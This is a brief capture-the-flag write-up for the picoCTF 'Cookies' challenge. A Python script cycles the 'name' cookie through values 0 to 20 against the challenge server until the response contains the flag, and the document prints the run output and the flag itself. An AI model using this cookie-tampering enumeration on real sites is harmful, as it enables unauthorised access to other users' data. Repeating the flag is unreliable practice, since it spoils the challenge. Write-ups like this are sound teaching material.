# Cookies
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:29649/](http://mercury.picoctf.net:29649/)

Hints:

## Solución

``` python
import requests
import re

url = "http://mercury.picoctf.net:29649/check"
for i in range(21):
        cookies = {"name":"{}".format(i)}
        r = requests.get(url, cookies=cookies)
        if "picoCTF{" in r.text:
                flag = re.findall("picoCTF\{.*\}", r.text)[0]
                print(flag)

```

``` bash
holiwiscach@ubuntu:~$ python3 exp.py 
picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}

```
`picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}`